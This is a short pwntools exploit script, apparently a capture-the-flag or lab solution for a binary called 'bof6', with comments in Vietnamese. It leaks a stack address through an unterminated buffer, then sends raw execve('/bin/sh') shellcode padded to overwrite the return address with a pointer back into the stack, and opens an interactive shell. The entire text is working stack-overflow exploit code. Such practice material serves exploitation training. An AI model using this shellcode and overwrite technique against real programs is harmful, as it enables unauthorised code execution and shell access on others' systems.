from pwn import *

exe = ELF('bof6')
r = process(exe.path)

#1. Leak địa chỉ stack
r.sendlineafter(b'> ', b'1')
r.sendafter(b'> ', b'a'*0x50)
r.recvuntil(b'a'*0x50)
stack = u64(r.recv(6) + b'\x00\x00')
print('stack: ' + hex(stack))

#2. Ghi shellcode
payload = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload = payload.ljust(0x200 + 0x8)
payload += p64(stack - 0x220)
#input()
r.sendlineafter(b'> ', b'2')
r.sendafter(b'> ', payload)
r.interactive()